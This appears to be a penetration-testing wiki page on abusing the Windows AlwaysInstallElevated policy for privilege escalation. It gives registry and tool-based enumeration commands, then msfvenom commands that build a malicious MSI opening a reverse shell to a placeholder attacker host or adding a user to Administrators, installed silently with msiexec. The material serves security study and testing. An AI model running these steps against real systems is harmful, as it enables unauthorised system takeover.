---
description: MITRE ATT&CK™  System Binary Proxy Execution - Msiexec - Technique T1218.007
---


# AlwaysInstallElevated 

## Theory

The **AlwaysInstallElevated** policy feature offers ALL users on a Windows operating systemis the ability to install an MSI package file with elevated (system) privileges.

## Practice

{% tabs %}
{% tab title="Enumerate" %}
Manual verification of the activation of this parameter is very simple and can be done with two commands. If it is enabled, it will create the value `AlwaysIntstallElevated` and set it to `0x1` (enabled) on the following two registry keys.
```bash
#Windows   
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Unix-like
reg.py domain.local/username:password123@IP query -keyName "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" -v AlwaysInstallElevated
reg.py domain.local/username:password123@IP query -keyName "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" -v AlwaysInstallElevated
```

Alternatively, using [PowerUp](https://github.com/PowerShellMafia/PowerSploit) from Powersploit we can enumerate the AlwaysInstallElevated policy.
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Alternatively, using the `systeminfo` module of [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```powershell
winPEASx64.exe systeminfo
```
{% endtab %}

{% tab title="Exploit" %}
We just have to generate a malicious MSI file and install it with `msiexec.exe`  

Generate a malicious MSI
```bash
# Reverse Shell
v4resk㉿kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f msi > package.msi

# Add user to Administrators
v4resk㉿kali$ msfvenom -p windows/exec CMD='net localgroup administrators <YOUR_USER> /add' -f msi > package.msi
```

Then, after downloading it to the target, install the MSI file using msiexec
```powershell
msiexec.exe /quiet /qn /i package.msi
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://juggernaut-sec.com/alwaysinstallelevated/" %}
